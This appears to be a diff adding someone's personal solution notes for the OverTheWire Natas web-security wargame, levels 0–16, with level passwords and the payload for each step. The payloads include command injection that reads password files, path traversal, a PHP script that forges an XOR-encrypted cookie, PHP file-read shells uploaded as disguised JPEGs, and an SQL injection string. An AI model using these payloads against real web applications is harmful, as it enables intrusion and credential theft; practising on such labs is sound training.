@@ -1,0 +1,168 @@
+Username: natas0
+Password: natas0
+URL:      http://natas0.natas.labs.overthewire.org
+
+natas1 
+source code
+The password for natas1 is gtVrDuiDfck831PqWsLEZy5gyDz1clto
+
+natas2
+Dev mode
+The password for natas2 is ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi
+
+natas3
+http://natas2.natas.labs.overthewire.org/files/users.txt
+natas3:sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14
+
+natas4
+http://natas3.natas.labs.overthewire.org/s3cr3t/users.txt
+natas4
+Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ
+
+natas5
+Tamper extension to modify the request
+iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq
+
+
+natas6
+change cookie value in dev mode console
+document.cookie="loggedin=1"
+aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1
+
+natas7
+http://natas6.natas.labs.overthewire.org/includes/secret.inc
+<?
+$secret = "FOEIUWGHFEEUHOFUOIU";
+?>
+input this inside the box
+
+7z3hEENjQtflzgnT29q7wAvMNfZdh0i9
+
+natas8
+http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8
+DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe
+
+natas9
+3d3d516343746d4d6d6c315669563362
+hex2bin
+==QcCtmMml1ViV3b
+Reverse text (strrev)
+b3ViV1lmMmtCcQ==
+decode64
+oubWYf2kBq
+
+W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl
+
+natas10
+; cat /etc/natas_webpass/natas10
+nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu
+
+
+natas11
+.* /etc/natas_webpass/natas11
+/etc/natas_webpass/natas11:U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK
+U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK
+
+natas12
+base64 coockie data value
+ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxEIaAw%3D
+
+
+DecypherText
+
+#!/usr/bin/php
+ 
+<? $cookie = base64_decode('ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxEIaAw%3D'); 
+function xor_encrypt($in){ 
+$text = $in; 
+$key = json_encode(array( "showpassword"=>"no", "bgcolor"=>"#ffffff"));
+ 
+$outText = '';
+ 
+// Iterate through each character
+ 
+for($i=0;$i<strlen($text);$i++) { 
+$outText .= $text[$i] ^ $key[$i % strlen($key)]; } return $outText; } 
+print xor_encrypt($cookie); ?>
+
+=
+qw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8JqwnJqL
+We get the XOR Key used to encrypt
+qw8J
+
+
+Then re-encrypt the text du import it in the cookie :
+
+
+$text = json_encode(array( "showpassword"=>"yes", "bgcolor"=>"#ffffff"));
+
+function xor_encrypt($in) {
+ $text = $in; 
+ $key = "qw8J";
+ 
+ $outText = '';
+
+ for($i=0;$i<strlen($text);$i++) {
+    $outText .= $text[$i] ^ $key[$i % strlen($key)];
+ }
+  return $outText;
+}
+print base64_encode(xor_encrypt($text));
+
+
+ClVLIh4ASCsCBE8lAxMacFMOXTlTWxooFhRXJh4FGnBTVF4sFxFeLFMK
+
+
+Inject in cookie from the console:
+document.cookie="data=ClVLIh4ASCsCBE8lAxMacFMOXTlTWxooFhRXJh4FGnBTVF4sFxFeLFMK"
+
+The password for natas12 is EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3
+
+
+
+natas13
+Download Fiddler Web Debugger to intercept packets
+
+Create a file .php to read your password
+#!/usr/bin/php
+ 
+<? readfile('/etc/natas_webpass/natas13'); ?>
+Upload file while intercepting packets and modify the request with 
+the extension filename .php.
+So that when you click the link, the file is read and password displayed.
+
+jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY
+
+
+
+
+natas14
+
+Burp suite, intercept
+Change Mime type
+Content-Type: image/jpeg
+Change with HexEditor the beginning of the file
+FFD8FF for jpeg
+intercept and modify the filename with .php
+result : ÿØÿLg96M10TdfaPyVBkJdjymbllQ5L6qdl1
+Content of the jpeg file : ÿØÿ<? readfile('/etc/natas_webpass/natas14'); ?>
+
+
+Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1
+
+
+natas15
+
+SQL injection
+" OR "1"="1" "
+Level bugged
+
+AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J
+
+
+natas16
+See Script Natas15
+
+WaIHEacj63wnNIBROHeqi3p9t0m5nhmh
+
+
